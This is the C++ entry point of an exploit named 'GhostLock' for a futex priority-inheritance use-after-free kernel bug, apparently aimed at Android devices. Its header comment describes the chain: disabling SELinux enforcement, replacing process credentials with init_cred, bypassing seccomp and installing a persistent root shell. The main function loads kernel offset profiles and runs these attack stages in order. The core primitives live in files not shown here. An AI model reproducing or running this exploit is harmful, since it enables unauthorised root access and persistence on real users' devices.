/*
 * GhostLock — CVE-2026-43499 futex PI UAF exploit
 *
 * W1: SELinux permissive -> W2: cred = init_cred -> W3: seccomp bypass ->
 * independent root shell: ksud late-load + module watch.
 *
 * This translation unit is the thin adapter: parse, run the stage sequence and
 * map the outcome to the process exit code. Setup, attack primitives, victim
 * protocol and stage policy live in their own units under ghostlock::ops,
 * ghostlock::victim, ghostlock::race and ghostlock::stages.
 */

#include "legacy_support/legacy_entrypoint_starter.h"
#include "profile_entry.h"
#include "session/exploit_stages.hpp"

#include <array>
#include <cstring>

using namespace ghostlock;
using namespace ghostlock::profile;

int main(int argc, char **argv) {
    struct kernel_offsets decoded = {};
    std::array<char, 256> release_buf{};
    bool app_call = false;
    const char *prebuilt_path = nullptr;
    const char *dump_dir = nullptr;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--ghostlock-app-call") == 0) {
            app_call = true;
        } else if (strcmp(argv[i], "--load-prebuilt-profile") == 0 &&
                   i + 1 < argc) {
            prebuilt_path = argv[++i];
        } else if (strcmp(argv[i], "--dump-kernel-log") == 0 && i + 1 < argc) {
            dump_dir = argv[++i];
        } else {
            pr_error("usage: %s [--ghostlock-app-call | --load-prebuilt-profile <bin>]"
                     " [--dump-kernel-log <dir>]\n", argv[0]);
            return 1;
        }
    }
    if (app_call && prebuilt_path) {
        pr_error("choose one entrypoint\n");
        return 1;
    }

    int loaded;
    if (prebuilt_path) {
        loaded = profile_entry::read_glk1_file(
            prebuilt_path, &decoded, release_buf.data(), release_buf.size());
    } else if (app_call) {
        loaded = profile_entry::read_glk1_stdin(
            &decoded, release_buf.data(), release_buf.size());
    } else {
        loaded = legacy_support::start_legacy_entrypoint(
            &decoded, release_buf.data(), release_buf.size());
    }
    if (loaded != 0) {
        pr_error("cannot load profile\n");
        return 1;
    }

    ExploitSession &session = g_exploit_session;
    if (stages::run_setup_stage(decoded, dump_dir) ==
        stages::StageResult::Failed)
        return 1;

    switch (stages::run_w1_stage(session)) {
        case stages::StageResult::Failed:
            return 1;
        case stages::StageResult::Done:
            return 0;
        case stages::StageResult::Continue:
            break;
    }

    stages::VictimChain chain;
    if (stages::run_w2_w3_chain(session, &chain) == stages::StageResult::Failed) {
        return 1;
    }
    return stages::run_handoff_stage(session, chain) == stages::StageResult::Failed
               ? 1
               : 0;
}
